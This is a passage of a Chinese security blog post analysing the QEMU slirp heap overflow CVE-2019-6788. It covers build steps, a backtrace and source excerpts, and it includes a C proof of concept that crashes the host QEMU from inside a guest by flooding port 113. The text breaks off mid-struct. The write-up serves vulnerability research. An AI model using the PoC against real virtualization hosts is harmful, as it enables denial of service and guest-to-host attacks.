<!DOCTYPE html>



  


<html class="theme-next gemini use-motion" lang="zh-Hans">
<head><meta name="generator" content="Hexo 3.8.0">
  <meta charset="UTF-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
<meta name="theme-color" content="#222">



  
  
    
    
  <script src="/lib/pace/pace.min.js?v=1.0.2"></script>
  <link href="/lib/pace/pace-theme-flash.min.css?v=1.0.2" rel="stylesheet">







<meta http-equiv="Cache-Control" content="no-transform">
<meta http-equiv="Cache-Control" content="no-siteapp">
















  
  
  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">




  
  
  
  

  
    
    
  

  
    
      
    

    
  

  

  

  
    
      
    

    
  

  
    
    
    <link href="//fonts.googleapis.com/css?family=STZhongsong:300,300italic,400,400italic,700,700italic|Roboto Slab:300,300italic,400,400italic,700,700italic|consolas:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
  






<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">

<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">


  <link rel="apple-touch-icon" sizes="180x180" href="/images/014.jpg?v=5.1.4">


  <link rel="icon" type="image/png" sizes="32x32" href="/images/014.jpg?v=5.1.4">


  <link rel="icon" type="image/png" sizes="16x16" href="/images/014.jpg?v=5.1.4">






  <meta name="keywords" content="CVE分析,Qemu,">










<meta name="description" content="CVE-2019-6788前置知识调了几个CVE之后，我觉得CVE和CTF最大的区别在于，首先你需要对于CVE发生的设备如何运作有深刻的理解，因为我们需要写程序与其交互来触发poc/exp(可能我们复现时觉得只用到了一小部分，但是我相信作为发现者，其对于此软件和此模块的功能作用等一定有着深刻的见解)。其次需要对相关领域的知识很了解才能有更广的思路去书写构造相对稳定的exp。 协议与其对应的数据包格">
<meta name="keywords" content="CVE分析,Qemu">
<meta property="og:type" content="article">
<meta property="og:title" content="CVE-2019-6788调试分析">
<meta property="og:url" content="http://yoursite.com/2020/05/20/CVE-2019-6788/index.html">
<meta property="og:site_name" content="xiaoxiaorenwu">
<meta property="og:description" content="CVE-2019-6788前置知识调了几个CVE之后，我觉得CVE和CTF最大的区别在于，首先你需要对于CVE发生的设备如何运作有深刻的理解，因为我们需要写程序与其交互来触发poc/exp(可能我们复现时觉得只用到了一小部分，但是我相信作为发现者，其对于此软件和此模块的功能作用等一定有着深刻的见解)。其次需要对相关领域的知识很了解才能有更广的思路去书写构造相对稳定的exp。 协议与其对应的数据包格">
<meta property="og:locale" content="zh-Hans">
<meta property="og:image" content="https://i.loli.net/2021/02/26/8YAupT6vdBqE1LZ.png">
<meta property="og:image" content="https://i.loli.net/2021/02/26/abONMdgzs4rLktq.png">
<meta property="og:image" content="https://i.loli.net/2021/02/26/BiVuA439Z2PdgDI.png">
<meta property="og:image" content="https://s3.ax1x.com/2021/02/26/yz70uq.png">
<meta property="og:image" content="https://s3.ax1x.com/2021/02/26/yz7yUU.png">
<meta property="og:image" content="https://s3.ax1x.com/2021/02/26/yz765F.png">
<meta property="og:updated_time" content="2021-02-26T15:59:13.765Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="CVE-2019-6788调试分析">
<meta name="twitter:description" content="CVE-2019-6788前置知识调了几个CVE之后，我觉得CVE和CTF最大的区别在于，首先你需要对于CVE发生的设备如何运作有深刻的理解，因为我们需要写程序与其交互来触发poc/exp(可能我们复现时觉得只用到了一小部分，但是我相信作为发现者，其对于此软件和此模块的功能作用等一定有着深刻的见解)。其次需要对相关领域的知识很了解才能有更广的思路去书写构造相对稳定的exp。 协议与其对应的数据包格">
<meta name="twitter:image" content="https://i.loli.net/2021/02/26/8YAupT6vdBqE1LZ.png">



<script type="text/javascript" id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/',
    scheme: 'Gemini',
    version: '5.1.4',
    sidebar: {"position":"left","width":350,"display":"hide","offset":20,"b2t":true,"scrollpercent":true,"onmobile":false},
    fancybox: true,
    tabs: true,
    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
    duoshuo: {
      userId: '0',
      author: '博主'
    },
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>



  <link rel="canonical" href="http://yoursite.com/2020/05/20/CVE-2019-6788/">





  <title>CVE-2019-6788调试分析 | xiaoxiaorenwu</title>
  








</head>

<body itemscope="" itemtype="http://schema.org/WebPage" lang="zh-Hans">

  
  
    
  

  <div class="container sidebar-position-left page-post-detail">
    <div class="headband"></div>

    <header id="header" class="header" itemscope="" itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-wrapper">
  <div class="site-meta custom-logo">
    

    <div class="custom-logo-site-title">
      <a href="/" class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">xiaoxiaorenwu</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
      
        <p class="site-subtitle">生活的艰辛，三分来自压力，七分来自攀比，我想做个小人物</p>
      
  </div>

  <div class="site-nav-toggle">
    <button>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>

<nav class="site-nav">
  

  
    <ul id="menu" class="menu">
      
        
        <li class="menu-item menu-item-home">
          <a href="/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
            
            首页
          </a>
        </li>
      
        
        <li class="menu-item menu-item-about">
          <a href="/about" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
            
            关于
          </a>
        </li>
      
        
        <li class="menu-item menu-item-tags">
          <a href="/tags" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
            
            标签
          </a>
        </li>
      
        
        <li class="menu-item menu-item-categories">
          <a href="/categories" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
            
            分类
          </a>
        </li>
      
        
        <li class="menu-item menu-item-archives">
          <a href="/archives" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
            
            归档
          </a>
        </li>
      

      
        <li class="menu-item menu-item-search">
          
            <a href="javascript:;" class="popup-trigger">
          
            
              <i class="menu-item-icon fa fa-search fa-fw"></i> <br>
            
            搜索
          </a>
        </li>
      
    </ul>
  

  
    <div class="site-search">
      
  <div class="popup search-popup local-search-popup">
  <div class="local-search-header clearfix">
    <span class="search-icon">
      <i class="fa fa-search"></i>
    </span>
    <span class="popup-btn-close">
      <i class="fa fa-times-circle"></i>
    </span>
    <div class="local-search-input-wrapper">
      <input autocomplete="off" placeholder="搜索..." spellcheck="false" type="text" id="local-search-input">
    </div>
  </div>
  <div id="local-search-result"></div>
</div>



    </div>
  
</nav>



 </div>
    </header>

    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          <div id="content" class="content">
            

  <div id="posts" class="posts-expand">
    

  

  
  
  

  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/05/20/CVE-2019-6788/">

    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
      <meta itemprop="name" content="">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/xxrw.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="xiaoxiaorenwu">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">CVE-2019-6788调试分析</h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-05-20T23:00:00+08:00">
                2020-05-20
              </time>
            

            

            
          </span>

          
            <span class="post-category">
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing">
                  <a href="/categories/CVE分析/" itemprop="url" rel="index">
                    <span itemprop="name">CVE分析</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
              <span class="post-comments-count">
                <span class="post-meta-divider">|</span>
                <span class="post-meta-item-icon">
                  <i class="fa fa-comment-o"></i>
                </span>
                <a href="/2020/05/20/CVE-2019-6788/#comments" itemprop="discussionUrl">
                  <span class="post-comments-count valine-comment-count" data-xid="/2020/05/20/CVE-2019-6788/" itemprop="commentCount"></span>
                </a>
              </span>
            
          

          
          

          
            <span class="post-meta-divider">|</span>
            <span class="page-pv"><i class="fa fa-file-o"></i>
            <span class="busuanzi-value" id="busuanzi_value_page_pv"></span>
            </span>
          

          
            <div class="post-wordcount">
              
                
                <span class="post-meta-item-icon">
                  <i class="fa fa-file-word-o"></i>
                </span>
                
                  <span class="post-meta-item-text">字数统计&#58;</span>
                
                <span title="字数统计">
                  11.7k
                </span>
              

              
                <span class="post-meta-divider">|</span>
              

              
                <span class="post-meta-item-icon">
                  <i class="fa fa-clock-o"></i>
                </span>
                
                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
                
                <span title="阅读时长">
                  64 min
                </span>
              
            </div>
          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        <h1 id="CVE-2019-6788"><a href="#CVE-2019-6788" class="headerlink" title="CVE-2019-6788"></a>CVE-2019-6788</h1><h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><p>调了几个<code>CVE</code>之后，我觉得<code>CVE</code>和<code>CTF</code>最大的区别在于，首先你需要对于<code>CVE</code>发生的设备如何运作有深刻的理解，因为我们需要写程序与其交互来触发<code>poc/exp</code>(可能我们复现时觉得只用到了一小部分，但是我相信作为发现者，其对于此软件和此模块的功能作用等一定有着深刻的见解)。其次需要对相关领域的知识很了解才能有更广的思路去书写构造相对稳定的<code>exp</code>。</p>
<p>协议与其对应的数据包格式</p>
<p><code>slirp</code>相关</p>
<p><code>IP Fragmentation</code>相关</p>
<p>如何利用<code>raw socket</code>发送自己构造的<code>tcp</code>数据包：</p>
<p><a href="https://www.pdbuchan.com/rawsock/rawsock.html" target="_blank" rel="noopener">https://www.pdbuchan.com/rawsock/rawsock.html</a></p>
<p><a href="https://www.pdbuchan.com/rawsock/get4.c" target="_blank" rel="noopener">https://www.pdbuchan.com/rawsock/get4.c</a></p>
<p><a href="https://www.pdbuchan.com/rawsock/icmp4.c" target="_blank" rel="noopener">https://www.pdbuchan.com/rawsock/icmp4.c</a></p>
<p><a href="https://sock-raw.org/papers/sock_raw" target="_blank" rel="noopener">https://sock-raw.org/papers/sock_raw</a></p>
<p><a href="https://cloud.tencent.com/developer/article/1008530" target="_blank" rel="noopener">SOCK_RAW的内幕和应用</a></p>
<h2 id="搭建环境"><a href="#搭建环境" class="headerlink" title="搭建环境"></a>搭建环境</h2><p>可以直接使用<code>CVE-2015-5165</code>搭建好的<code>img</code>和<code>bzImage</code>，然后<code>qemu</code>需要重新<code>checkout</code>一下，作者使用的是<code>v3.1.50</code>，但是<code>github</code>上已经没有这个<code>version</code>了，所以这里用<code>v3.1.0</code>代替：</p>
<p>关于参数解释：</p>
<p><a href="https://my.oschina.net/kelvinxupt/blog/265108" target="_blank" rel="noopener">https://my.oschina.net/kelvinxupt/blog/265108</a></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">sudo cp -r ../CVE-2015-5165/qemu ./</span><br><span class="line"><span class="built_in">cd</span> qemu</span><br><span class="line">git checkout tags/v3.1.0</span><br><span class="line">mkdir -p bin/debug/naive</span><br><span class="line"><span class="built_in">cd</span> bin/debug/naive</span><br><span class="line">../../../configure --target-list=x86_64-softmmu --<span class="built_in">enable</span>-debug --<span class="built_in">disable</span>-werror</span><br><span class="line">make -j4</span><br></pre></td></tr></table></figure>
<p>启动脚本<code>run.sh</code>：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">./qemu/bin/debug/native/x86_64-softmmu/qemu-system-x86_64 \</span><br><span class="line">-kernel ./bzImage \</span><br><span class="line">-append <span class="string">"console=ttyS0 root=/dev/sda rw quiet"</span> \</span><br><span class="line">-<span class="built_in">enable</span>-kvm -m 2G -nographic \</span><br><span class="line">-hda ../img/qemu.img \</span><br><span class="line"><span class="comment">#-net user,hostfwd=tcp::2222-:22 -net nic \</span></span><br><span class="line">-L ./pc-bios \</span><br></pre></td></tr></table></figure>
<p>关于<code>-net</code>，<code>-netdev</code>，<code>-nic</code>参数的解释说明：</p>
<p><a href="https://zhuanlan.zhihu.com/p/41258581" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/41258581</a></p>
<p>关于<code>qemu</code>配置网络：</p>
<p><a href="https://wzt.ac.cn/2019/09/10/QEMU-networking/" target="_blank" rel="noopener">https://wzt.ac.cn/2019/09/10/QEMU-networking/</a></p>
<h2 id="调试与poc"><a href="#调试与poc" class="headerlink" title="调试与poc"></a>调试与poc</h2><p>需要使用<code>user mode(slirp)</code>启动<code>qemu</code>，启动脚本为：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">./qemu/bin/debug/native/x86_64-softmmu/qemu-system-x86_64 \</span><br><span class="line">-kernel ./bzImage \</span><br><span class="line">-append <span class="string">"console=ttyS0 root=/dev/sda rw quiet"</span> \</span><br><span class="line">-<span class="built_in">enable</span>-kvm -m 2G -nographic \</span><br><span class="line">-hda ../img/qemu.img \</span><br><span class="line">-L ./pc-bios</span><br></pre></td></tr></table></figure>
<p>启动后查看网卡，发现存在<code>ip</code>为<code>10.0.2.15</code>的局域网网卡，与其对应的宿主机网卡<code>ip</code>为<code>10.0.2.2</code>(在宿主机上看不到)。</p>
<p><img src="https://i.loli.net/2021/02/26/8YAupT6vdBqE1LZ.png" alt="image.png"></p>
<p><code>poc.c</code>：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// poc.c</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;netdb.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;arpa/inet.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> s, ret;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">ip_addr</span>;</span></span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">0x500</span>];</span><br><span class="line"></span><br><span class="line">    s = socket(AF_INET,SOCK_STREAM,<span class="number">0</span>);</span><br><span class="line">    ip_addr.sin_family = AF_INET;</span><br><span class="line">    ip_addr.sin_addr.s_addr = inet_addr(<span class="string">"10.0.2.2"</span>); <span class="comment">// host IP</span></span><br><span class="line">    ip_addr.sin_port = htons(<span class="number">113</span>); <span class="comment">// vulnerable port</span></span><br><span class="line">    connect(s,(struct sockaddr *)&amp;ip_addr,<span class="keyword">sizeof</span>(struct sockaddr_in));</span><br><span class="line">    <span class="built_in">memset</span>(buf,<span class="string">'A'</span>,<span class="number">0x500</span>);</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>) &#123;</span><br><span class="line">        write(s,buf,<span class="number">0x500</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在宿主机上运行<code>sudo nc -lvv 113</code>，在虚拟机里运行<code>poc</code>，成功触发<code>crash</code>：</p>
<p><img src="https://i.loli.net/2021/02/26/abONMdgzs4rLktq.png" alt="image.png"></p>
<p><code>poc</code>中的<code>host IP</code>未必需要一定要是宿主机，其他可联通机器的<code>ip</code>也可。</p>
<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>断在<code>tcp_emu</code>：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#0  tcp_emu (so=0x7f46f8000d40, m=0x7f46f80140e0) at /home/xiaoxiaorenwu/escape/qemu/CVE-2015-5165/qemu/slirp/tcp_subr.c:558</span></span><br><span class="line"><span class="comment">#1  0x00005652e9b7c521 in tcp_input (m=0x7f46f80140e0, iphlen=0x14, inso=0x0) at /home/xiaoxiaorenwu/escape/qemu/CVE-2015-5165/qemu/slirp/tcp_input.c:499</span></span><br><span class="line"><span class="comment">#2  0x00005652e9b74aee in ip_input (m=0x7f46f80140e0) at /home/xiaoxiaorenwu/escape/qemu/CVE-2015-5165/qemu/slirp/ip_input.c:202</span></span><br><span class="line"><span class="comment">#3  0x00005652e9b772fc in slirp_input (slirp=0x5652ebd188c0, pkt=0x7f470a85cc70 "RU\n", pkt_len=0x536) at /home/xiaoxiaorenwu/escape/qemu/CVE-2015-5165/qemu/slirp/slirp.c:758</span></span><br><span class="line"><span class="comment">#4  0x00005652e9b6be89 in net_slirp_receive (nc=0x5652ebd186c0, buf=0x7f470a85cc70 "RU\n", size=0x536) at /home/xiaoxiaorenwu/escape/qemu/CVE-2015-5165/qemu/net/slirp.c:114</span></span><br><span class="line"><span class="comment">#5  0x00005652e9b60ebd in qemu_deliver_packet (sender=0x5652ebd18120, flags=0x0, data=0x7f470a85cc70 "RU\n", size=0x536, opaque=0x5652ebd186c0) at /home/xiaoxiaorenwu/escape/qemu/CVE-2015-5165/qemu/net/net.c:577</span></span><br><span class="line"><span class="comment">#6  0x00005652e9b62ebe in qemu_net_queue_deliver (queue=0x5652ebd17e80, sender=0x5652ebd18120, flags=0x0, data=0x7f470a85cc70 "RU\n", size=0x536) at /home/xiaoxiaorenwu/escape/qemu/CVE-2015-5165/qemu/net/queue.c:157</span></span><br><span class="line"><span class="comment">#7  0x00005652e9b62fc7 in qemu_net_queue_send (queue=0x5652ebd17e80, sender=0x5652ebd18120, flags=0x0, data=0x7f470a85cc70 "RU\n", size=0x536, sent_cb=0x0)</span></span><br><span class="line">    at /home/xiaoxiaorenwu/escape/qemu/CVE-2015-5165/qemu/net/queue.c:192</span><br><span class="line"><span class="comment">#8  0x00005652e9b61043 in qemu_send_packet_async_with_flags (sender=0x5652ebd18120, flags=0x0, buf=0x7f470a85cc70 "RU\n", size=0x536, sent_cb=0x0) at /home/xiaoxiaorenwu/escape/qemu/CVE-2015-5165/qemu/net/net.c:640</span></span><br><span class="line"><span class="comment">#9  0x00005652e9b6107b in qemu_send_packet_async (sender=0x5652ebd18120, buf=0x7f470a85cc70 "RU\n", size=0x536, sent_cb=0x0) at /home/xiaoxiaorenwu/escape/qemu/CVE-2015-5165/qemu/net/net.c:647</span></span><br><span class="line"><span class="comment">#10 0x00005652e9b610a8 in qemu_send_packet (nc=0x5652ebd18120, buf=0x7f470a85cc70 "RU\n", size=0x536) at /home/xiaoxiaorenwu/escape/qemu/CVE-2015-5165/qemu/net/net.c:653</span></span><br><span class="line"><span class="comment">#11 0x00005652e9b6385d in net_hub_receive (hub=0x5652ebd17f40, source_port=0x5652ebd19570, buf=0x7f470a85cc70 "RU\n", len=0x536) at /home/xiaoxiaorenwu/escape/qemu/CVE-2015-5165/qemu/net/hub.c:55</span></span><br><span class="line"><span class="comment">#12 0x00005652e9b63a6a in net_hub_port_receive (nc=0x5652ebd19570, buf=0x7f470a85cc70 "RU\n", len=0x536) at /home/xiaoxiaorenwu/escape/qemu/CVE-2015-5165/qemu/net/hub.c:114</span></span><br><span class="line"><span class="comment">#13 0x00005652e9b60ebd in qemu_deliver_packet (sender=0x5652ed11d1c0, flags=0x0, data=0x7f470a85cc70 "RU\n", size=0x536, opaque=0x5652ebd19570) at /home/xiaoxiaorenwu/escape/qemu/CVE-2015-5165/qemu/net/net.c:577</span></span><br><span class="line"><span class="comment">#14 0x00005652e9b62ebe in qemu_net_queue_deliver (queue=0x5652ebd18390, sender=0x5652ed11d1c0, flags=0x0, data=0x7f470a85cc70 "RU\n", size=0x536) at /home/xiaoxiaorenwu/escape/qemu/CVE-2015-5165/qemu/net/queue.c:157</span></span><br><span class="line"><span class="comment">#15 0x00005652e9b62fc7 in qemu_net_queue_send (queue=0x5652ebd18390, sender=0x5652ed11d1c0, flags=0x0, data=0x7f470a85cc70 "RU\n", size=0x536, sent_cb=0x0)</span></span><br><span class="line">    at /home/xiaoxiaorenwu/escape/qemu/CVE-2015-5165/qemu/net/queue.c:192</span><br><span class="line"><span class="comment">#16 0x00005652e9b61043 in qemu_send_packet_async_with_flags (sender=0x5652ed11d1c0, flags=0x0, buf=0x7f470a85cc70 "RU\n", size=0x536, sent_cb=0x0) at /home/xiaoxiaorenwu/escape/qemu/CVE-2015-5165/qemu/net/net.c:640</span></span><br><span class="line"><span class="comment">#17 0x00005652e9b6107b in qemu_send_packet_async (sender=0x5652ed11d1c0, buf=0x7f470a85cc70 "RU\n", size=0x536, sent_cb=0x0) at /home/xiaoxiaorenwu/escape/qemu/CVE-2015-5165/qemu/net/net.c:647</span></span><br><span class="line"><span class="comment">#18 0x00005652e9b610a8 in qemu_send_packet (nc=0x5652ed11d1c0, buf=0x7f470a85cc70 "RU\n", size=0x536) at /home/xiaoxiaorenwu/escape/qemu/CVE-2015-5165/qemu/net/net.c:653</span></span><br><span class="line"><span class="comment">#19 0x00005652e9abfb84 in e1000_send_packet (s=0x7f470a83a010, buf=0x7f470a85cc70 "RU\n", size=0x536) at /home/xiaoxiaorenwu/escape/qemu/CVE-2015-5165/qemu/hw/net/e1000.c:609</span></span><br><span class="line"><span class="comment">#20 0x00005652e9ac0037 in xmit_seg (s=0x7f470a83a010) at /home/xiaoxiaorenwu/escape/qemu/CVE-2015-5165/qemu/hw/net/e1000.c:661</span></span><br><span class="line"><span class="comment">#21 0x00005652e9ac0713 in process_tx_desc (s=0x7f470a83a010, dp=0x7f4707e529a0) at /home/xiaoxiaorenwu/escape/qemu/CVE-2015-5165/qemu/hw/net/e1000.c:756</span></span><br><span class="line"><span class="comment">#22 0x00005652e9ac0987 in start_xmit (s=0x7f470a83a010) at /home/xiaoxiaorenwu/escape/qemu/CVE-2015-5165/qemu/hw/net/e1000.c:811</span></span><br><span class="line"><span class="comment">#23 0x00005652e9ac1d2f in set_tctl (s=0x7f470a83a010, index=0xe06, val=0x17) at /home/xiaoxiaorenwu/escape/qemu/CVE-2015-5165/qemu/hw/net/e1000.c:1184</span></span><br><span class="line"><span class="comment">#24 0x00005652e9ac1e97 in e1000_mmio_write (opaque=0x7f470a83a010, addr=0x3818, val=0x17, size=0x4) at /home/xiaoxiaorenwu/escape/qemu/CVE-2015-5165/qemu/hw/net/e1000.c:1256</span></span><br><span class="line"><span class="comment">#25 0x00005652e98f3796 in memory_region_write_accessor (mr=0x7f470a83c8b0, addr=0x3818, value=0x7f4707e52b08, size=0x4, shift=0x0, mask=0xffffffff, attrs=...)</span></span><br><span class="line">    at /home/xiaoxiaorenwu/escape/qemu/CVE-2015-5165/qemu/memory.c:450</span><br><span class="line"><span class="comment">#26 0x00005652e98f3935 in access_with_adjusted_size (addr=0x3818, value=0x7f4707e52b08, size=0x4, access_size_min=0x4, access_size_max=0x4, access=0x5652e98f3725 &lt;memory_region_write_accessor&gt;, mr=0x7f470a83c8b0, attrs=...)</span></span><br><span class="line">    at /home/xiaoxiaorenwu/escape/qemu/CVE-2015-5165/qemu/memory.c:506</span><br><span class="line"><span class="comment">#27 0x00005652e98f619c in memory_region_dispatch_write (mr=0x7f470a83c8b0, addr=0x3818, data=0x17, size=0x4, attrs=...) at /home/xiaoxiaorenwu/escape/qemu/CVE-2015-5165/qemu/memory.c:1158</span></span><br><span class="line"><span class="comment">#28 0x00005652e98aa68f in address_space_rw (as=0x5652ea0edf80 &lt;address_space_memory&gt;, addr=0xfebc3818, attrs=..., buf=0x7f470a9c1028 "\027", len=0x4, is_write=0x1)</span></span><br><span class="line">    at /home/xiaoxiaorenwu/escape/qemu/CVE-2015-5165/qemu/exec.c:2439</span><br><span class="line"><span class="comment">#29 0x00005652e98f0f76 in kvm_cpu_exec (cpu=0x5652ebd34490) at /home/xiaoxiaorenwu/escape/qemu/CVE-2015-5165/qemu/kvm-all.c:1859</span></span><br><span class="line"><span class="comment">#30 0x00005652e98d8aed in qemu_kvm_cpu_thread_fn (arg=0x5652ebd34490) at /home/xiaoxiaorenwu/escape/qemu/CVE-2015-5165/qemu/cpus.c:979</span></span><br><span class="line"><span class="comment">#31 0x00007f47094976ba in start_thread (arg=0x7f4707e53700) at pthread_create.c:333</span></span><br><span class="line"><span class="comment">#32 0x00007f47091cd4dd in clone () at ../sysdeps/unix/sysv/linux/x86_64/clone.S:109</span></span><br></pre></td></tr></table></figure>
<p><code>/slirp/socket.h</code>：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">socket</span> &#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">socket</span> *<span class="title">so_next</span>,*<span class="title">so_prev</span>;</span>      <span class="comment">/* For a linked list of sockets */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">int</span> s;                           <span class="comment">/* The actual socket */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">int</span> pollfds_idx;                 <span class="comment">/* GPollFD GArray index */</span></span><br><span class="line"></span><br><span class="line">  Slirp *slirp;			   <span class="comment">/* managing slirp instance */</span></span><br><span class="line"></span><br><span class="line">			<span class="comment">/* XXX union these with not-yet-used sbuf params */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">mbuf</span> *<span class="title">so_m</span>;</span>	           <span class="comment">/* Pointer to the 